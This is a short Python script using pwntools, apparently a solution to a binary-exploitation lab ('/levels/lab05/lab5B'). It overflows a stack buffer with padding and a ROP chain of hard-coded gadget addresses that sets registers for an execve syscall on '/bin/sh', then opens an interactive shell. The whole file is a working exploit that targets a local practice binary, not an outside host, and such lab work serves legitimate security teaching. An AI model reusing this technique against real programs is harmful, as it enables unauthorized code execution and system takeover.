import struct
import pwn
import sys

def d(n):
  return struct.pack('<I', n)

def do_my_bidding(addr):
  POP_EAX = 0x080bbf26
  POP_EDX = 0x0806ec5a
  POP_EBX = 0x080481c9
  POP_ECX = 0x080e55ad
  INT_80  = 0x08049401

  target_addr = 0xbffff680 - addr
  s = "/bin/sh\x00" + "z" * 132

  p = pwn.process('/levels/lab05/lab5B')

  print(p.recv(100))

  rop = s \
  + pwn.p32(POP_EAX) \
  + pwn.p32(0x0b) \
  + pwn.p32(POP_ECX) \
  + pwn.p32(0x00) \
  + pwn.p32(POP_EDX) \
  + pwn.p32(0x00) \
  + pwn.p32(POP_EBX) \
  + pwn.p32(target_addr) \
  + pwn.p32(INT_80)

  p.sendline(rop)
  p.interactive()

v = int(sys.argv[1], 16)
do_my_bidding(v)
